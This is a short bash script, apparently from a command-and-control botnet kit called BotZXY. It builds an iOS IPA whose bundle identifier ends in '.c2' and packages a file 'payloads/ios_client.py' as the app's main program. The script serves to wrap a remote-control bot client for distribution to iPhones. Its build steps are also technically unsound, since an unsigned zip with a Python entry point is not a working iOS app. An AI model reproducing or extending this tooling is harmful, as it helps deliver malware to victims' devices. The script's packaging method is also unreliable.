#!/bin/bash
# BotZXY - iOS IPA Builder

echo "========================================"
echo "   BotZXY - iOS IPA Builder v2.0"
echo "========================================"

# Richiede Xcode e iOS SDK
if ! command -v xcodebuild &> /dev/null; then
    echo "[ERRORE] Xcode non trovato"
    exit 1
fi

# Crea struttura per IPA
mkdir -p botzxy_ios/Payload

# Crea un semplice wrapper per l'app
cat > botzxy_ios/Info.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key>
    <string>BotZXY</string>
    <key>CFBundleIdentifier</key>
    <string>com.botzxy.c2</string>
    <key>CFBundleVersion</key>
    <string>2.0</string>
    <key>CFBundleShortVersionString</key>
    <string>2.0</string>
    <key>LSRequiresIPhoneOS</key>
    <true/>
    <key>UISupportedInterfaceOrientations</key>
    <array>
        <string>UIInterfaceOrientationPortrait</string>
    </array>
</dict>
</plist>
EOF

# Copia il client come script
mkdir -p botzxy_ios/Payload/BotZXY.app
cp payloads/ios_client.py botzxy_ios/Payload/BotZXY.app/main.py

# Crea il file IPA (zip)
cd botzxy_ios
zip -r BotZXY.ipa Payload/
cd ..

echo "========================================"
echo "   Build IPA completato!"
echo "   File: botzxy_ios/BotZXY.ipa"
echo "========================================"